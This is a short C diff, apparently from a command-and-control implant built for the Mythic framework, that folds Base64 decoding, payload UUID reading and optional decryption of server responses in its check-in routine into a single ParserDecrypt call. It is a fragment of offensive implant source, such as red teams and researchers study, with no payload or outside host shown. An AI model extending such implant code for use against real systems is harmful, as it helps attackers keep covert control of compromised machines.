@@ -240,16 +240,7 @@ BOOL CheckinSend()
 
     ParserNew(&Output, pOutData, OutLen);
 
-    if ( !ParserBase64Decode(&Output) ) {
-        _err("Base64 decoding failed");
-    }
-    PCHAR receivedPayloadUUID = ParserGetString(&Output, &sizeUuid);
-    if ( xenonConfig->isEncryption )
-    {
-        if (!CryptoMythicDecryptParser(&Output)) {
-            _err("Failed to decrypt parser");
-        }
-    }
+    ParserDecrypt(&Output);
 
 #endif
 
